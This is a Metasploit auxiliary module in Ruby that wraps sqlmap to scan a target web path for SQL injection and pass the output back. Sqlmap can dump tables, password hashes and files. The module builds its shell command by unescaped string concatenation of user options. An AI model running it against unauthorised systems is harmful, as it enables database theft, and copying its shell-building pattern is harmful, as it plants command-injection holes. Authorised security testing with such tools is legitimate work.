require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanUniqueQuery
	include Msf::Auxiliary::Scanner


	def initialize(info = {})
		super(update_info(info,	
			'Name'			=> 'SQLMAP SQL Injection External Module',
			'Description'	=> %q{
				This module launch a sqlmap session.
				sqlmap is an automatic SQL injection tool developed in Python.
				Its goal is to detect and take advantage of SQL injection
				vulnerabilities on web applications. Once it detects one
				or more SQL injections on the target host, the user can
				choose among a variety of options to perform an extensive
				back-end database management system fingerprint, retrieve
				DBMS session user and database, enumerate users, password
				hashes, privileges, databases, dump entire or user
				specific DBMS tables/columns, run his own SQL SELECT
				statement, read specific files on the file system and much
				more.
			},
			'Author'		=> [ 'bernardo.damele [at] gmail.com', 'daniele.bellucci [at] gmail.com' ],
			'License'		=> BSD_LICENSE,
			'Version'		=> '$Revision$',
			'References'	=>
				[
					['URL', 'http://sqlmap.sourceforge.net'],
				]
			))
		
		register_options(
			[
				OptString.new('METHOD', [ true,  "HTTP Method", 'GET' ]),
				OptString.new('PATH', [ true,  "The path/file to test for SQL injection", 'index.php' ]),
				OptString.new('QUERY', [ false, "HTTP GET query", 'id=1' ]),
				OptString.new('BODY', [ false, "The data string to be sent through POST", '' ]),
				OptString.new('OPTS', [ false,  "The sqlmap options to use", ' ' ]),
				OptPath.new('SQLMAP_PATH', [ true,  "The sqlmap >= 0.6.1 full path ", '/sqlmap/sqlmap.py' ]), 
				OptBool.new('BATCH', [ true,  "Never ask for user input, use the default behaviour", true ])
			], self.class)
	end
	
	# Modify to true if you have sqlmap installed.
	def wmap_enabled
		false
	end

	# Test a single host
	def run_host(ip)
			
		sqlmap = datastore['SQLMAP_PATH'] 
			
		if not sqlmap
			print_error("The sqlmap script could not be found")
			return
		end

		data = datastore['BODY']
		method = datastore['METHOD'].upcase

		sqlmap_url  = (datastore['SSL'] ? "https" : "http")
		sqlmap_url += "://" + self.target_host + ":" + datastore['RPORT']
		sqlmap_url += "/" + datastore['PATH'] 

		if method == "GET"
			sqlmap_url += '?' + datastore['QUERY']
		end

		cmd  = sqlmap + ' -u \'' + sqlmap_url + '\''
		cmd += ' --method ' + method
		cmd += ' ' + datastore['OPTS']

		if not data.empty?
			cmd += ' --data \'' + data + '\''
		end

		if datastore['BATCH'] == true
			cmd += ' --batch'
		end

		print_status("exec: #{cmd}")
		IO.popen( cmd ) do |io|
			io.each_line do |line|
				print_line("SQLMAP: " + line.strip)
			end
		end
	end

end
